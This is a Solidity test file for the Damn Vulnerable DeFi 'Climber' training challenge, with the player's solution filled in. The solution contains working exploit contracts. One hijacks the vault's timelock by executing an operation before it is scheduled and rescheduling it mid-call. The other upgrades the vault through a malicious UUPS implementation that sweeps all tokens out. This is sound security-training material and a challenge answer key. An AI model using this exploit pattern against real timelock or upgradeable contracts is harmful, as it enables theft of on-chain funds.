// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {
    ClimberTimelock,
    CallerNotTimelock,
    PROPOSER_ROLE,
    ADMIN_ROLE
} from "../../src/climber/ClimberTimelock.sol";
import {
    ERC1967Proxy
} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {
    UUPSUpgradeable
} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attack attack = new Attack();
        Attack2 attack2 = new Attack2();
        address[] memory targets = new address[](3);
        // targets[0] = address(timelock);
        targets[0] = address(vault);
        targets[1] = address(timelock);
        targets[2] = address(attack2);
        uint256[] memory values = new uint256[](3);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;

        bytes[] memory dataElements = new bytes[](3);
        bytes32 salt = keccak256("salt");

        dataElements[0] = abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (address(attack), "")
        );
        dataElements[1] = abi.encodeCall(
            AccessControl.grantRole,
            (keccak256("PROPOSER_ROLE"), address(attack2))
        );
        dataElements[2] = abi.encodeCall(
            Attack2.run,
            (targets, values, salt, timelock, address(attack))
        );

        // bytes[] memory scheduledData = new bytes[](3);

        // scheduledData[
        //     0
        // ] = hex"4f1ef286000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000";

        // scheduledData[
        //     1
        // ] = hex"2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000f0c36e5bf7a10debae095410c8b1a6e9501dc0f7";

        // scheduledData[
        //     2
        // ] = hex"90bd1e6d000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000180a05e334153147e75f3f416139b5109d1179cb56fef6a4ecb4c4cbc92a7c37b7000000000000000000000000000000000000000000000000000000000000000030000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264000000000000000000000000f0c36e5bf7a10debae095410c8b1a6e9501dc0f7000000000000000000000000f0c36e5bf7a10debae095410c8b1a6e9501dc0f70000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000644f1ef286000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000442f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000f0c36e5bf7a10debae095410c8b1a6e9501dc0f7000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

        // dataElements[2] = abi.encodeCall(
        //     timelock.schedule,
        //     (targets, values, scheduledData, salt)
        // );
        // timelock.schedule(targets, values, dataElements, salt);

        timelock.execute(targets, values, dataElements, salt);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

contract Attack is UUPSUpgradeable {
    function _authorizeUpgrade(address newImplementation) internal override {}

    function sweepFunds(address token, address recovery) external {
        SafeTransferLib.safeTransfer(
            token,
            recovery,
            IERC20(token).balanceOf(address(this))
        );
    }
}
contract Attack2 {
    //   address[] memory targets = new address[](3);
    //     uint256[] memory values = new uint256[](3);
    //    bytes32 salt = keccak256("salt");
    bytes[] dataElements = new bytes[](3);

    function run(
        address[] calldata targets,
        uint256[] calldata values,
        bytes32 salt,
        ClimberTimelock timelock,
        address attack
    ) public {
        dataElements[0] = abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (attack, "")
        );
        dataElements[1] = abi.encodeCall(
            AccessControl.grantRole,
            (keccak256("PROPOSER_ROLE"), address(this))
        );
        dataElements[2] = abi.encodeCall(
            this.run,
            (targets, values, salt, timelock,attack)
        );
        timelock.schedule(targets, values, dataElements, salt);
    }
}
